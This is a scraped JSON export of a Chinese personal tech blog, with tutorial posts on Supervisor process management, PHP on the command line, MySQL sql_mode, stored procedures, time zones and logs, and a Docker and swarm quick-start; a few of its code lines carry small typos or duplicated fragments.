x这个是进程名，如果下面的numprocs参数为1的话，就不用管这个参数了，它默认值%(program_name)s也就是上面的那个program冒号后面的numprocs&#x3D;1 &#x2F;&#x2F; 进程数量当不为1时的时候，就是进程池的概念，注意process_name的设置autostart&#x3D;true &#x2F;&#x2F; 是否自动启动autorestart&#x3D;true &#x2F;&#x2F; 程序意外退出是否自动重启startsecs&#x3D;1 &#x2F;&#x2F; 自动重启间隔 startretries&#x3D;20 &#x2F;&#x2F; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把此进程的状态置为FAIL 默认值为3redirect_stderr&#x3D;true &#x2F;&#x2F; 如果为true，则stderr的日志会被写入stdout日志文件中 理解为重定向输出的日志user&#x3D;root &#x2F;&#x2F; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。我这里面设置的这个用户，也可以对supervisord进行管理 stopsignal&#x3D;INTstderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log &#x2F;&#x2F; 子进程的stdout的日志路径 输出日志文件stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log &#x2F;&#x2F; 错误日志文件 当redirect_stderr&#x3D;true。这个就不用 启动1$ supervisord -c &#x2F;etc&#x2F;supervisord.conf 常用命令整理停止进程，program_name 为 [program:x] 里的 x 1supervisorctl stop program_name 启动进程 1supervisorctl start program_name 重启进程 1supervisorctl restart program_name 结束所有属于名为 groupworker 这个分组的进程 (start，restart 同理) 1supervisorctl stop groupworker: 结束 groupworker:name1 这个进程 (start，restart 同理) 1supervisorctl stop groupworker:name1 停止全部进程，注：start、restart、stop 都不会载入最新的配置文件 1supervisorctl stop all 载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程 1supervisorctl reload 根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启 1supervisorctl update 常见问题unlinking stale socket /var/run/supervisor.sock1234$ find &#x2F; -name supervisor.sock&#x2F;run&#x2F;supervisor.sock$ unlink &#x2F;run&#x2F;supervisor.sock 参考链接 “unix:///tmp/supervisor.sock no such file” 错误处理 https://segmentfault.com/a/1190000015768529 使用 supervisor 管理进程 Python 进程管理工具 Supervisor 使用教程","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}]},{"title":"在 Linux 命令行中执行和使用 PHP 代码","slug":"execute-and-use-php-code-on-the-linux-command-line","date":"2020-07-29T00:08:12.000Z","updated":"2020-07-29T00:25:28.412Z","comments":true,"path":"execute-and-use-php-code-on-the-linux-command-line/","link":"","permalink":"https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/","excerpt":"众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。 所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。","text":"众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。 所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。 获取安装信息在安装完PHP 以及Nginx 之后，接下来我们通常需要做的是，在/usr/local/var/www (Mac 上的Nginx 工作目录)上创建一个内容为&lt;?php phpinfo(); ?&gt;，名为index.php的文件来测试PHP 是否安装正确。 执行以下命令即可： 1# echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php 然后，使用浏览器访问http://127.0.0.1/index.php，不出意外可以看到： 如何在终端中直接查看该信息？ 1# php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less 如果你觉得上面这种方式太麻烦了，那么还有一种更简便的方式可以达到同样的效果。 1# php -r &#39;php phpinfo();&#39; | less 交互模式有时候我们会遇到这样一种情况，想测试一小段代码，看看其运行结果，但是又不想重新创建一个文件，太麻烦了。 如果这个时候有一个地方可以直接运行这段代码且输出结果，那该多好啊。 PHP 为我们提供了两种交互模式，前者是自动的，后者是手动的。 Interactive shell Interactive mode enabled 两种模式都是使用 php -a 命令进入。 Interactive shell使用这个交互式shell，你可以直接在命令行窗口里输入PHP并直接获得输出结果。 1234567$ php -aInteractive shellphp &gt;echo &quot;Hello PHP&quot;;Hello PHPphp &gt; echo 10+90;100 回车即可查看输出内容。 Interactive mode enabled1234$ php -aInteractive mode enabledphp &gt;echo &quot;Hello PHP&quot;; 如果出现的是这个模式，说明你的PHP并不支持交互式shell， 不过不用担心，这个模式同样也可以执行PHP 代码，只是代码的执行方式有些区别。 输入了所有PHP代码后，输入Ctrl-Z（windows里），或输入Ctrl-D（linux里），你输入的所有代码将会一次执行完成并输出结果。 输入exit或者⌃ + c 退出交互模式。 PHP脚本在终端中可以把PHP 脚本作为Shell 脚本来运行。 首先你需要创建一个PHP 脚本文件： 1# echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php -e 表示激活转义字符。 注意，这个脚本文件中的第一行#!/usr/bin/php，就像是Shell 脚本中的#!/bin/bash。目的是告诉Linux 命令行使用PHP 解析器来解析该文件。 运行该脚本： 12# chmod +x phpscript.php &#x2F;&#x2F; 使脚本具有执行权限# .&#x2F;phpscript.php &#x2F;&#x2F;执行脚本 总结 php -a：进入交互模式 php -f：解析和执行文件 php -h：获取帮助 php -i：查看PHP 信息和配置 php -m：显示已经安装的模块 php -r：运行PHP代码不使用脚本标签’‘ php -v：查看PHP cli版本 php -ini：查看php.ini 配置文件","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"如何解决“ORDER BY子句不在SELECT列表中”的问题","slug":"list-causes-mysql-5-7-with-select-distinct-and-order-by","date":"2020-07-28T00:29:37.000Z","updated":"2020-07-28T15:28:10.444Z","comments":true,"path":"list-causes-mysql-5-7-with-select-distinct-and-order-by/","link":"","permalink":"https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/","excerpt":"记录一个最近遇到的Mysql 问题。","text":"记录一个最近遇到的Mysql 问题。 问题描述：在本地项目中，部分SQL 语句执行起来，总是会报一个错。而同样的SQL，在线上的服务器中执行起来没有任何问题。 错误提示内容： 1Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query 我的第一反应就是检查Mysql 的版本，很巧的是本地Mysql的版本确实比服务器的版本低一些。很快我就想到一定是版本存在差异性，导致语法不兼容。 升级Mysql既然是版本不一的问题，那就升级本地的Mysql 好了。 因为我的Mysql 是之前通过Homebrew 安装的，所以如需要升级，根本不用我自己手动去寻找安装包，直接通过Homebrew 的Upgrade 命令自动升级就好了。 起初我还担心自动升级会不会把我的Mysql 的版本更新的5.7以上，后来证明是我想多了。 不过在正式更新之前需要做好以下几件事情： 对数据库做好必要的备份 停止本地Mysql 服务 确定所要更新的Mysql 版本 做好以上三件事之后，就可以开始升级了。 1234$ brew search mysqlmysql@5.7 ✔$ brew upgrade mysql@5.7... 终于安装好之后，再次开启Mysql 的服务，我发现还是没有解决我的问题，还是会提示相同的错误。 这时候我才意识到这个问题和Mysql 的版本没有关系，有关系应该是相关的模块。 通过查阅一番资料，才发现是因为 group by 中的列一定要出现在 select 中，除非强制 sqlmode 中使用 ONLY_FULL_GROUP_BY。 开启sql-mode 模式123456789$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf# 增加如下内容[mysqld]sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;# 或者[mysqld]sql_mode &#x3D; &quot;&quot; 重启Mysql 服务器，即可。 参考链接 如何解决 MySQL 5.7带有SELECT DISTINCT和ORDER BY的问题 | stack voerflow Mysql 服务器SQL 模式","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 存储过程入门","slug":"getting-started-with-mysql-stored-procedures","date":"2020-07-27T15:50:50.000Z","updated":"2020-07-27T15:51:55.775Z","comments":true,"path":"getting-started-with-mysql-stored-procedures/","link":"","permalink":"https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/","excerpt":"最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。 应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。","text":"最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。 应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。 以下两点是其中比较重要的部分： 关于变量的使用 在存储过程中使用动态SQL 语句 存储过程中的变量MySQL存储过程常见的变量：局部变量、用户变量、系统变量。 局部变量在过程体中，可以声明局部变量，用来临时保存一些值。 1DECLARE var_name[, var_name] ... type [DEFAULT value]; 其中，type为MySQL的数据类型，如:int、float、date、varchar(length) 。 使用局部变量时，需要注意以下两点： DECLARE用来声明局部变量，且DECLARE仅被用在BEGIN … END复合语句里，并且必须在复合语句的开头，在任何其它语句之前；可以被用在嵌套的块中，除了那些用相同名字声明变量的块。 如果要给变量提供一个默认值，使用DEFAULT子句(值可以是常数，也可以指定为一个表达式)；如果没有DEFAULT子句，初始值为NULL。 用户变量用户变量与数据库连接有关：在当前连接中声明的变量，在连接断开的时候，就会消失；在此连接中声明的变量无法在另一连接中使用。 用户变量使用@关键字去定义。 在存储过程中动态执行SQL其实这个理解成一套模版，只要按照标准去执行这套模版，就可以了。 1234567891011121314151617181920212223242526272829303132333435-- 连接数据库use databaseName;-- 定义结束符为 $$delimiter $$-- 判断是否存在该名称的存储过程，如果存在就删除drop procedure if exists wk;-- 创建新的存储过程create procedure wk()begin -- 声明变量 declare days int default 366; declare dates int;-- 循环体WHILE days - 1 &gt; 0 DO -- 为变量赋值 SET dates &#x3D; DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;); SET days &#x3D; days - 1; -- 拼接表名 set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates); -- 拼接需要执行SQL 语句，后面的内容需要根据实际情况替换掉 SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot; -- 需要执行的SQL &quot;); -- 预处理动态SQL 语句，其中stmt 是一个变量 PREPARE stmt FROM @sql; -- 执行SQL 语句 EXECUTE stmt ; -- 释放prepare deallocate prepare stmt;-- 结束循环end WHILE;-- 结束定义语句end $$delimiter ;call wk(); 大致上就是这样，至此，一个完整的Mysql 存储过程就完成了。 如何在终端执行Mysql 文件？ SQL 脚本准备好了，有两种方式可以执行它。 方式一：不进入Mysql 终端，直接在命令行终端执行 方式二：进入Mysql 终端，在Mysql 终端中执行 这两种方式的共同点就是都需要已知Mysql 密码。 对于方式一，可以使用以下命令来执行： 1mysql -u root -p &lt; .&#x2F;modify_user_table.sql 可以指定数据库： 1mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql 对于方式二，可以使用以下命令来执行： 12345&#x2F;&#x2F; 进入Mysql 终端mysql -uroot -p &#x2F;&#x2F; 执行SQL 文件source .&#x2F;modify_user_table.sql 参考链接 Mysql 终端执行SQL 文件 Mysql 存储过程中的变量定义 Mysql 中的变量定义和赋值 Mysql 存储过程中使用动态SQL 语句","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 查看修改默认时区","slug":"mysql-view-and-modify-the-default-time-zone","date":"2020-07-25T15:43:57.000Z","updated":"2020-07-25T15:45:03.233Z","comments":true,"path":"mysql-view-and-modify-the-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/","excerpt":"在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。 这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。","text":"在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。 这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。 查看默认时区12345678mysql&gt; show variables like &quot;%time_zone%&quot;;+------------------+--------+| Variable_name | Value |+------------------+--------+| system_time_zone | CST || time_zone | SYSTEM |+------------------+--------+2 rows in set (0.01 sec) 设置默认时区设置当前会话12mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;mysql&gt; show variables like &quot;%time_zone%&quot;; 此修改只会对当前会话有效。 全局设置1mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;; 需要重启该会话，该配置才生效。 编辑 my.ini123# 打开Mysql 的配置文件 my.ini[mysqld]default-time_zone &#x3D; &#39;+8:00&#39; 需要重启Mysql 服务 时间格式GMT（Greenwich Mean Time）：格林威治标准时间UTC：世界标准时间CST（China Standard Time）：中国标准时间 GMT + 8 = UTC + 8 = CST 参考链接 Mysql 查看修改时区 time_zone","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"了解 Mysql 日志","slug":"understanding-the-mysql-log","date":"2020-07-25T15:38:53.000Z","updated":"2020-07-31T12:39:49.199Z","comments":true,"path":"understanding-the-mysql-log/","link":"","permalink":"https://www.0x2beace.com/understanding-the-mysql-log/","excerpt":"日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。","text":"日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。 日志简介Mysql 的日志主要分为四类，使用这些日志文件，可以查看Mysql 内部发生的事情，这四类日志分别是： 错误日志：记录Mysql 服务的启动、运行或停止Mysql服务时出现的问题。 查询日志：记录建立的客户端连接和执行的语句。 二进制日志：记录所有更改数据的语句，可以用于数据恢复。 慢查询日志：记录所有执行时间超过 long_query_time 的所有查询或不使用索引的查询。 二进制日志二进制日志主要记录 Mysql 数据库的变化。二进制日志以一种有效的格式，并且是事务安全的方式包含更新日志中可用的所有信息。 启动和设置二进制日志默认情况下，二进制日志是关闭的，可以通过修改mysql 的配置文件来启动和设置二进制日志。 配置文件 my.ini 中有几个设置是关于二进制日志的： 1234567# 如果需要启用，就在 mysqld 组下，加上 log-bin 选项[mysqld]log-binlog-bin [&#x3D;path&#x2F; [filename] ]expire_logs_days &#x3D; 10max_binlog_size &#x3D; 100M log-bin定义开启二进制日志，path 表示日志文件所在的目录路径，filename 指定了日志文件的名称。 expire_logs_days定义了Mysql 清除过期日志的时间，即二进制日至的自动删除的天数。 max_binlog_size定义了单个文件的大小限制，不能将变量设置为大于1GB或者小于4096B。默认值为1GB. 如何检查自己的二进制日志是否开启了呢？ 输入以下命令： 1mysql&gt; show variables like &#39;log_%&#39;; 查看二进制日志查看二进制文件个数及文件名，前提是开启了二进制日志： 1mysql&gt; show binary logs; 删除二进制日志Mysql 也为我们提供了删除二进制日志的方法，有两种，作用不相同。 删除所有二进制日志文件： 1mysql&gt; RESET MASTER; 删除指定二进制日志文件： 12# 其中，binlog.000003 是指二进制文件的名称mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;; 使用二进制日志恢复数据库如果启用了Mysql 的二进制日志，在数据库出现意外丢失数据时，可以使用 Mysqlbinlog 工具从指定时间点开始（例如，最后一次备份）直到现在。 Mysqlbinlog 恢复数据库的语法如下： 1mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass 实例：使用Mysqlbinlog 恢复Mysql 数据库到2019年1月30日15:27:48时的状态，执行如下命令： 1mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass 暂停二进制日志功能因为修改Mysql 配置文件可以启用、停用二进制日志功能，但是需要重启Mysql 服务器。Mysql 为我们提供了一种更简单的方式可以暂停记录二进制日志。 暂停记录二进制日志： 1mysql&gt; SET sql_log_bin &#x3D; 0; 恢复记录二进制日志： 1mysql&gt; SET sql_log_bin &#x3D; 1; 错误日志错误日志文件包含了当Mysqld 启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。错误日志默认是开启的。 启动和设置错误日志通过修改my.ini 配置文件，来启用或者停用错误日志 12345# 如果需要启用，就在 mysqld 组下，加上 log-error 选项[mysqld]log-errorlog-error&#x3D;[path&#x2F;filename] 查看错误日志首先使用如下命令查看错误日志的存储路径以及文件名： 1mysql&gt; show variables like &#39;log_error&#39;; 删除错误日志文件Mysql 的错误日志文件是以文本文件的形式存储在文件系统中，可以直接删除。 1mysql&gt; flush logs; 通用查询日志通用查询日志记录了Mysql 的所有操作，包括启动和关闭服务、执行查询和更新语句等。 启用和设置通用查询日志同样的，打开Mysql 的my.ini 配置文件。 1234[mysqld]loglog&#x3D;[path\\filename] 这里有两种方式，log 选项后面如果没有带任何参数表示使用Mysql 默认的存储位置，上面的也一样。 查看通用查询日志可以通过log 设置的日志文件存储路径，去查看具体文件。 慢查询日志慢查询日志记录查询时长超过指定时间的日志。通过慢查询日志，可以找出执行时间较长、执行效率较低的语句，然后进行优化。 启用和设置慢查询日志同样的，打开编辑Mysql 的my.ini 配置文件： 12345[mysqld]log-slow-querieslog-slow-queries&#x3D;[path\\filename]long_query_time&#x3D;n n 表示查询时间的极限值，如果超过了这个值，这个查询过程就会被记录到慢查询日志文件中。 查询慢查询日志同上。 上面这些日志配置的更改都需要重启服务器才能生效，另外还有一种方式可以查看运行时日志。 启用实时日志1234set global general_log &#x3D; on;&#x2F;&#x2F; 查看日志文件目录show variables like &#39;general_log_file&#39;; 这种方式的好处就是不需要重启Mysql 服务。 如果需要禁用： 1set global general_log &#x3D; off; 关于平时应该打开哪些日志的问题。 日志的开启既会影响Mysql 的性能，又会占用大量的磁盘空间。因此如果不必要，应尽可能的少开启日志，根据不同的使用环境，考虑开启不同的日志。 例如：在开发环境中优化查询低效率的语句，可以开启慢查询日志；如果需要记录用的所有查询操作，可以开启通用查询日志；如果需要记录数据的变更，可以开启二进制日志；错误日志默认开启；","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Docker 快速上手","slug":"docker-quick-start","date":"2020-07-23T04:32:57.000Z","updated":"2020-08-22T01:02:14.223Z","comments":true,"path":"docker-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-quick-start/","excerpt":"这篇笔记的主要目的是用来记录学习 Docker 的过程。Docker这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。","text":"这篇笔记的主要目的是用来记录学习 Docker 的过程。Docker这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。 诞生软件开发最大的麻烦事之一，就是环境配置。 开发者常常说的一句话：它在我的机器上可以跑了。言下之意就是，其他机器可能跑不了。因为可以正常跑的前提是：操作系统的设置，各种软件和组件、库的安装，只有它们都正确了，软件才能正常运行。 配置环境如此麻烦，换一台机器，就得重来一次，旷日费时。因此，聪明的人们就想到，能不能从根本上解决问题。软件可以带环境安装。（这里说的软件是指最终要运行的工程） 虚拟机虚拟机（virtual machine，简称VM）就是带环境安装的一种解决方案。它可以在一个操作系统中运行另外一种操作系统。比如在Windows系统中运行Linux 系统。应用程序对此毫无感觉，因为虚拟机看上去跟真是系统一模一样。而对于底层系统来说，虚拟机就是一个普通文件，不需要就删掉，对其他部分没有影响。 虚拟机（VM）是物理硬件的抽象， 将一台服务器转变为多台服务器。 虽然用户可以通过虚拟机还原软件的原始环境，但是这个方案有几个缺点。在后面会做比较。 容器由于虚拟机存在一些缺点，Linux 发展出了另一种轻量级的操作系统虚拟化解决方案，Linux 容器（Linux Containers，缩写为 LXC）。 Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。 容器是应用层的抽象，它将代码和依赖关系打包在一起。 多个容器可以在同一台机器上运行，并与其他容器共享操作系统内核，每个容器在用户空间中作为独立进程运行。容器占用的空间比VM少（容器映像的大小通常为几十MB），可以处理更多的应用程序，并且需要更少的VM和操作系统。 由于容器是进程级别的，相比虚拟机有很多的优势。后面会做比较。 Docker 是什么Docker 属于Linux 容器的一种封装，提供简单易用的容器使用接口。 它是目前最流行的 Linux 容器解决方案。 Docker 与虚拟机的区别 名称 占用资源 启动速度 级别 Docker 占用资源少 启动快 轻量级 虚拟机 占用资源多 启动慢 重量级 Docker CE 与 Docker EEDocker CE(Docker Community Edition) 是社区版，简单理解是免费使用，提供小企业与小的IT团队使用,希望从Docker开始，并尝试基于容器的应用程序部署。 Docker EE(Docker Enterprise Edition) 是企业版，收费。提供功能更强。适合大企业与打的IT团队。为企业开发和IT团队设计，他们在生产中构建、交付和运行业务关键应用程序 Docker CE 有三种类型的更新通道：stable、test和 nightly Stable 提供一般可用性的最新版本 Test 提供在一般可用之前准备好进行测试的预发布。 Nightly 提供下一个主要版本的最新正在进行的工作。 安装 Docker-CE这里以Ubuntu 18.04 为例： 1234561. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\$(lsb_release -cs) stable&quot;4. sudo apt update5. sudo apt install docker-ce 将当前用户添加到docker 用户组，可以不用sudo 运行docker 12$ sudo groupadd docker$ sudo usermod -aG docker $USER-aG docker $USER Docker 镜像Docker 镜像就是一个只读的模板。 例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。 镜像可以用来创建 Docker 容器。 Docker 容器Docker 利用容器来运行应用。 容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。 可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。 注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。 Docker 仓库仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像（image），每个镜像有不同的标签（tag）。 仓库分为公开仓库（Public）和私有仓库（Private）两种形式。 最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。 国内的公开仓库包括 Docker Pool 等，可以提供大陆用户更稳定快速的访问。 当然，用户也可以在本地网络内创建一个私有仓库。 当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上 pull 下来就可以了。 注：Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。 镜像和容器的区别容器和镜像的关系如下： Dockerfile用于定义镜像，依赖镜像来运行容器，仓库则是存放镜像的地方。 Dockerfile 是什么？Dockerfile 是一个创建Docker 镜像所需的文件，其中会包含一组指令来告诉Docker 如何构建我们的镜像。 示例： 123456789101112131415161718192021$ cat Dockerfile# 使用官方Python运行时作为父映像FROM python:2.7-slim# 将工作目录设置为&#x2F;appWORKDIR &#x2F;app# 将当前目录内容复制到容器at &#x2F;appCOPY . &#x2F;app# 安装requirements.txt中指定的任何需要的包RUN pip install --trusted-host pypi.python.org -r requirements.txt# #让80 端口号对外开放EXPOSE 80# 定义环境变量ENV NAME World# 在容器启动时运行app.pyCMD [&quot;python&quot;, &quot;app.py&quot;] 如何用镜像创建一个容器？首先，我们需要一个镜像，然后才能创建容器。想要在Docker 上创建一个镜像，非常简单。 cd 到项目文件夹中 使用 docker build --tag=mydockerapp . 命令，创建一个Docker 镜像。–tag 选项命名。 使用 docker run -d -p 4000:80 mydockerapp命令，创建一个新容器。 该命令表示：Docker 以mydockerapp镜像创建一个新容器，同时以分离模式在后台运行该应用程序，将该容器的80端口映射到主机的4000端口。 其中：-d：让容器在后台运行-p：将容器内部端口映射到指定的主机端口上。-P :是容器内部端口随机映射到主机的端口上。 Docker 网络端口映射使用命令： 1$ docker run -p 4000:80 mydocker 然后用docker container ls查看容器列表 下图的意思表示：将该容器的端口80映射到4000，从而生成正确的URL http://localhost:4000。 Docker 开放了 80 端口映射到主机端口 4000 上。 Docker 容器连接前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。下面我们来实现通过端口连接到一个 docker 容器 如何运行负载均衡应用？在开始之前，你得首先满足以下条件： 安装Docker 1.13或更高版本。 了解如何创建容器。 确保已经创建镜像并发布到注册表。我们在这里需要使用该共享镜像。 确保镜像作为已部署的容器运行，并能访问。 确保有docker-compose.yml配置文件，然后依次执行以下命令 1234567$ docker swarm init$ docker stack deploy -c docker-compose.yml getstartedlab# 顺利的话，就能直接部署成功了。使用docker container ls 可以看到正在运行的实例。# 使用 curl http:&#x2F;&#x2F;localhost:4000 或者是刷新浏览器。# 无论以哪种方式，容器ID 都会发生变化。从而证明负载均衡成功。# 对于每个请求，以循环方式选择5个任务中的一个来响应。# 容器ID与上一个命令（docker container ls -q）的输出匹配。 关于服务在分布式应用程序中，应用程序的不同部分称为“服务”。例如，如果您想象一个视频共享站点，它可能包括一个用于在数据库中存储应用程序数据的服务，一个用户在上传内容后在后台进行视频转码的服务，一个用于前端的服务，等等。 服务实际上只是“生产中的容器”。服务只运行一个镜像，但它编码了镜像运行的方式 - 它应该使用哪些端口，应该运行多少个容器副本，以便服务具有所需的容量，以及等等。扩展服务会更改运行该软件的容器实例的数量，从而为流程中的服务分配更多计算资源。 在服务中运行的单个容器称为任务。任务被赋予以数字递增的唯一ID，最多为replicas您定义 的数量docker-compose.yml。 幸运的是，使用Docker平台定义，运行和扩展服务非常容易 - 只需编写一个docker-compose.yml文件即可。 如何在Docker上安装 Docker Machine？Ubuntu 18.04 请看文末的参考链接。 MacOS 如果是从DockerHub官网下载的dmg 安装的Docker，不用担心，Docker-Machine 已经安装好了。 如何安装VirtualBox？Ubuntu 18.04 请看文末的参考链接。 MacOS 则需要从virtualbox官网下载dmg安装包。 你可能会遇到一个错误，参考解决：如何在MacOS上安装VirtualBox 了解Swarm集群群由多个节点组成，可以是物理或虚拟机。基本概念很简单：运行docker swarm init以启用swarm模式并使当前计算机成为一个swarm管理器。 这个章节是这个文档系列中学的时间最长的，坑有点多，走了不少弯路，这一节也挺重要的 重点记下笔记。 在MacOS 下，部分命令需要 sudo 权限。 创建一个集群（本地计算机的VM）在开始这部分之前，需要提前安装好Oracle VirtualBox. 1$ docker-machine create --driver virutalbox myvm1 如果你收到了这样的信息： 12$ Error with pre-create check: &quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot; 说明你的Vritualbox还是没有安装好。 查看正在运行的VM 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.104:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.105:2376 v17.06.2-ce 这样就成功的创建了一台VM，接下来我们要将这台机器作为管理器，第二台作为工作者。 另外值得一提的是，尽管我在Ubuntu 18.04 上分别安装好了docker-machine、virtualbox，但当我创建 VM 时，总是会提示我计算机没有开启什么虚拟化（BOIS）。 后来我大概想明白了，可能是我的那台服务器的配置太低了，真的是某个设置项没有启动导致的。 今天在MacBook 上重新操作了一边，异常顺利。 记录一个问题：使用docker-machine create --driver virtualbox myvm1创建VM时，创建成功了，但是并不是我想要的实例。得到了以下信息： 1234(default) Creating a new host-only adapter produced an error: hostonlyif create failed:(default) 0%...(default) Progress state: E_FAIL(default) VBoxManage.exe: error: Failed to create the host-only adapter 找了好久也没有找到答案，最后是怎么解决的呢？重启机器（加上 sudo）。 启动\\停止 VM 12$ docker-machine start Name$ docker-machine stop Name 初始化Swarm 并添加节点这里是一个小坑，之前在这里栽了好久。 这里有两种方式初始化节点或者说操作 VM（推荐第一种）： ssh 连接VM 实例，在Docker VM Cli 中执行命令 1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# &lt;myvm1 ip&gt; 指docker-machine ls 对应的 ip# 正常会得到这样一个输出To add a worker to this swarm, run the following command: 